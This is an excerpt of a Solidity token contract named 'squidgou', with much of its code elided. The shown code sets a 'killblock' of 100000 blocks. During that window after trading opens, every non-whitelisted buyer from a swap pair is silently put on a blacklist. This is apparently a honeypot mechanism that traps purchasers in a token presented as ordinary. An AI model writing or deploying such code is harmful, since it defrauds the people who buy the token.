...
abstract contract AbsToken is IERC20, Ownable {
    ...
    uint256 public killblock = 100000;
    ...
    constructor (
        ...
        holderRewardCondition = 50 * 10 ** IERC20(FISTAddress).decimals();
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                ...
                if (block.number < startTradeBlock + killblock) {
                    if(!_blackList[to] && !_swapPairList[to]) _blackList[to] = true;
                }
...
contract squidgou is AbsToken {
    constructor() AbsToken(
        ...
        9,
        2000,
        address(0x7E1C7E1CBC86140c511298CB79d719290c61e034),
        address(0x7E1C7E1CBC86140c511298CB79d719290c61e034)
    ){
    }
}